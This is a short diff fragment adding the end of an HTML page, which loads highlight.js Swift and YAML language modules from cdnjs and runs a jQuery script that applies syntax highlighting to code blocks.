+    <script async crossorigin="anonymous" defer integrity="sha512-B2wSfruPjr8EJL6IIzQr1eAuDwrsfIfccNf/LCEdxELCgC/S/ZMt/Uvk80aD79m7IqOqW+Sw8nbkvha20yZpzg==" src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.1.0/languages/swift.min.js"></script>
+  
+
+  
+    <script async crossorigin="anonymous" defer integrity="sha512-28oDiQZGKUVN6wQ7PSLPNipOcmkCALXKwOi7bnkyFf8QiMZQxG9EQoy/iiNx6Zxj2cG2SbVa4dXKigQhu7GiFw==" src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.1.0/languages/yaml.min.js"></script>
+  
+
+
+<script>
+$(document).ready(function() {
+  hljs.configure({ classPrefix: '', useBR: false });
+  $('pre.code-highlight > code, pre > code').each(function(i, block) {
+    if (!$(this).hasClass('codeblock')) {
+      $(this).addClass('codeblock');
+    }
+    hljs.highlightBlock(block);
+  });
+});
+</script>
+
+
+
+
+    
+  </body>
+</html>
+
